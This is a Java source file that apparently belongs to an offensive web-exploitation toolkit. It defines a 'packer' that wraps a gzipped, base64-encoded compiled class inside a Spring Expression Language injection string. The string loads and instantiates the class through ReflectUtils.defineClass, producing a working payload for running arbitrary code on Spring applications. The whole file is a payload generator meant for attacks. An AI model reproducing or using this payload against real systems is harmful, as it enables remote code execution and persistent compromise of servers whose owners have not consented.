package com.reajason.javaweb.packer.spel;

import com.reajason.javaweb.packer.ClassPackerConfig;
import com.reajason.javaweb.packer.Packer;
import com.reajason.javaweb.packer.PackerMeta;
import com.reajason.javaweb.packer.Packers;
import com.reajason.javaweb.packer.base64.GzipBase64Packer;
import org.kohsuke.MetaInfServices;

/**
 * @author ReaJason
 * @since 2024/12/13
 */
@MetaInfServices(Packer.class)
@PackerMeta(name = Packers.SpELSpringGzipJDK17, parent = Packers.SpEL, order = 1530)
public class SpELSpringGzipJDK17Packer implements Packer {

    @Override
    public boolean requiresSpringExpressionPackage() {
        return true;
    }

    @Override
    public boolean transportedAsSpelExpression() {
        return true;
    }
    String template = "T(org.springframework.cglib.core.ReflectUtils).defineClass('{{className}}',T(org.springframework.util.StreamUtils).copyToByteArray(new java.util.zip.GZIPInputStream(new java.io.ByteArrayInputStream(T(java.util.Base64).getDecoder().decode('{{base64Str}}')))),new java.net.URLClassLoader(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader()),null,T(java.lang.Class).forName('org.springframework.expression.ExpressionParser')).newInstance()";

    @Override
    public String pack(ClassPackerConfig config) {
        String className = config.getClassName();
        assertClassNameValid(className);
        return template.replace("{{className}}", className)
                .replace("{{base64Str}}", new GzipBase64Packer().pack(config));
    }

    public static void assertClassNameValid(String className) {
        String packageName = className.substring(0, className.lastIndexOf("."));
        if (!"org.springframework.expression".equals(packageName)) {
            throw new UnsupportedOperationException(className + " is not supported, please set className in same package org.springframework.expression, " +
                    "for example, org.springframework.expression.CommonUtil, org.springframework.expression.sub.CommonUtil will also not work");
        }
    }
}
